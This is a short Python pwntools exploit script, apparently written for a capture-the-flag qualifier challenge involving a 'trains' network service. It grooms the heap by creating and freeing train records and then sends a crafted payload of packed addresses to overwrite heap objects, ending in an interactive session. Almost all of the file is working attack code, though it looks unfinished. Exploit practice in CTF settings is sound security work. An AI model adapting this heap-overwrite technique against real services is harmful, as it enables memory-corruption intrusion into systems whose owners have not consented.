from pwn import *

# exit(0)
# s = remote("awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me", 80)
HOST="127.0.0.1"
s = remote(HOST, 9345)
prevl = s.level
s.level = 'debug'

head = "GET /trains HTTP/1.1\nContent-Type: text/html\n\n\n"
s.send(head+"\n\n")
#print s.recv(1024)


# create 3 trains
for i in range(1,3+1):
  s.recvuntil('Add train')
  s.send("1\n")
  s.send("n%d\n" %i)
  s.send("modelmodelmo%d\n" %i)
  s.send("typetypetype%d\n" %i)
  s.send("0\n")
  s.send("0\n")

print "=== OKAY ==="
#create a hole where the 2nd name was
s.send("4\n")
s.send("n\n")
s.send("2\n")
s.send("y\n")
s.send("x2\n") #this frees the old name, which will then be used as input we can smash from since it was ~32 in size. 

s.send("7\n")
s.recvuntil('Enter Index')
#s.send("1234\x00" + "A"*10   +"\n")  
s.send("1234" + "\x00" + ("A"*3 + p64(0xa09660)) + (p64(0xabcdabcd) + p64(0xa09660))*24  +"A\n")   #this smashes into our hole, overwriting ada objects on the heap

s.send("0"   +"\n")   # last index
raw_input()


#s.send("2"   +"\n")   #  trigger a print


#print s.recv(1024)
s.level = prevl
s.interactive() #lets see if we survived

s.close()
